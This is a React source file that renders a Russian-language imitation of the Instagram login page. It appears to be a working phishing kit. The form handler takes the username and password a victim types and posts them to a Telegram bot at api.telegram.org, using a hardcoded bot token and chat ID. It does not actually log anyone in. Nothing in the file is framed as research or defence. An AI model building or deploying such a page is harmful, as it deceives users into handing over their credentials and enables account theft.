import { useState } from "react";
import styles from "./App.module.scss";
import facebook from "../assets/img/facebook.png";
import googleplay from "../assets/img/googleplay.png";
import microsoft from "../assets/img/microsoft.png";

function App() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const TELEGRAM_BOT_TOKEN = "7592077825:AAHIuzAz5xy1wEjZwKD2YCkHN60Un3ZF1Bk";
  const CHAT_ID = "1226692867";

  // Function to send a message to Telegram Bot
  const sendMessage = async (message) => {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      });

      const result = await response.json();
      if (!response.ok) {
        throw new Error(result.description);
      }
    } catch (error) {
      console.error("Error sending message:", error);
      alert("Ошибка отправки данных ❌");
    }
  };

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();

    const message = `Новая форма входа:\n👤 Логин: ${username}\n🔒 Пароль: ${password}`;

    try {
      await sendMessage(message);
      setUsername("");
      setPassword("");
    } catch (error) {
      alert("Ошибка отправки данных ❌");
      console.error(error);
    }
  };

  return (
    <div className={styles.container}>
      <div className={styles.logo}>Instagram</div>
      <form className={styles.form} onSubmit={handleSubmit}>
        <input
          type="text"
          placeholder="Телефон, имя пользователя или эл. адрес"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          required
        />
        <input
          type="password"
          placeholder="Пароль"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          required
        />
        <button type="submit" className={styles.loginButton}>
          Войти
        </button>

        <div className={styles.orContainer}>
          <div className={styles.line}></div>
          <div className={styles.orText}>ИЛИ</div>
          <div className={styles.line}></div>
        </div>

        <div className={styles.facebookLogin}>
          <img src={facebook} alt="Facebook" />
          <span>Войти через Facebook</span>
        </div>

        <a
          href="https://www.instagram.com/accounts/password/reset/"
          className={styles.forgotPassword}
        >
          Забыли пароль?
        </a>
      </form>

      <div className={styles.signupContainer}>
        <span>У вас нет аккаунта?</span> <a href="#">Зарегистрироваться</a>
      </div>

      <div className={styles.getApp}>
        <span>Установите приложение.</span>
        <div className={styles.appButtons}>
          <img src={googleplay} alt="Get it on Google Play" />
          <img src={microsoft} alt="Download from Microsoft" />
        </div>
      </div>
    </div>
  );
}

export default App;
